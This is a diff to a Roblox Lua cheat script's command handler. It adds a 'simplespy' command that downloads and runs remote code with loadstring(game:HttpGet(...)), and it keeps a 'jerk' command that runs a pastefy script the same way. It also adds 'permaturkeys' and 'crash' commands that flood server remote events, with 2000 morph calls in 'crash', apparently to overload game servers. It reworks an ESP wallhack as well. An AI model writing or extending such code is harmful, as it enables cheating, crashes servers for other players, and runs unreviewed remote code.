@@ -106,6 +106,8 @@ local function processCommand(msg)
 		local volume = 1
 		remote:FireServer("newSound", randomName, workspace, assetId, pitch, volume, false)
 		remote:FireServer("playSound", randomName)
+	elseif isCmd(cmd, {"simplespy"}) then
+	loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
 	elseif isCmd(cmd, {"suicidegun"}) then
 		-- made by bobby
 		local ReplicatedStorage = game.ReplicatedStorage
@@ -255,6 +257,54 @@ local function processCommand(msg)
 				end
 			end
 		end)
+	elseif isCmd(cmd, {"permaturkeys"}) then
+		local amount = tonumber(args[2])
+		WearItemArgs = {
+			[1] = {
+				[1] = "Wear",
+				[2] = "130213380",
+				[3] = "Faces"
+			}
+		}
+		TurkeyArgs = {
+			[1] = "Turkey"
+		}
+		game:GetService("ReplicatedStorage").WearItem:FireServer(unpack(WearItemArgs))
+		wait(0.3)
+		for i = 1, amount do
+			if game.PlaceId == 558121634 then
+				game:GetService("ReplicatedStorage").MainEvent:FireServer("Morph", "Turkey")
+			else
+				workspace.Events.Morph.Player:FireServer(unpack(TurkeyArgs))
+			end
+		end
+		replicatesignal(Player.ConnectDiedSignalBackend)
+		task.wait(Players.RespawnTime + 0.20)
+		Player.Character.Humanoid.Health = 0
+
+	elseif isCmd(cmd, {"crash"}) then
+		WearItemArgs = {
+			[1] = {
+				[1] = "Wear",
+				[2] = "130213380",
+				[3] = "Faces"
+			}
+		}
+		TurkeyArgs = {
+			[1] = "Turkey"
+		}
+		game:GetService("ReplicatedStorage").WearItem:FireServer(unpack(WearItemArgs))
+		wait(0.3)
+		for i = 1, 2000 do
+			if game.PlaceId == 558121634 then
+				game:GetService("ReplicatedStorage").MainEvent:FireServer("Morph", "Turkey")
+			else
+				workspace.Events.Morph.Player:FireServer(unpack(TurkeyArgs))
+			end
+		end
+		replicatesignal(Player.ConnectDiedSignalBackend)
+		task.wait(Players.RespawnTime + 0.20)
+		Player.Character.Humanoid.Health = 0
 	elseif isCmd(cmd, {"speed"}) then
 		local amount = tonumber(args[2])
 		if amount then
@@ -288,16 +338,21 @@ local function processCommand(msg)
 			applyESP(player)
 		end
 
-		if not _G.espHooked then
-			_G.espHooked = true
-			Players.PlayerAdded:Connect(applyESP)
+		if not _G.espConnection then
+			_G.espConnection = Players.PlayerAdded:Connect(applyESP)
 		end
+
 	elseif isCmd(cmd, {"unesp"}) then
 		for _, player in ipairs(Players:GetPlayers()) do
 			if player ~= Player and player.Character then
 				local esp = player.Character:FindFirstChild("ESP_Highlight")
 				if esp then esp:Destroy() end
 			end
+		end
+
+		if _G.espConnection then
+			_G.espConnection:Disconnect()
+			_G.espConnection = nil
 		end
 	elseif isCmd(cmd, {"jerk"}) then
 		loadstring(game:HttpGet("https://pastefy.app/wa3v2Vgm/raw"))()
